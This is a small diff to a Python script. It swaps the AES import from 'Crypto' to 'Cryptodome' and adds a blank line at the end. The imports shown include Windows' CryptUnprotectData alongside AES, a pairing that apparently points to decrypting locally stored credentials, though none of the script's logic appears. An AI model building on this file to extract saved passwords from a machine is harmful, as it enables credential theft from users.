@@ -12,7 +12,7 @@ import time
 import ctypes
 import platform
 
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 from stuff.msgbox import *
 from blahlivmata import hex
@@ -385,3 +385,4 @@ def main():
         
 
 main()
+
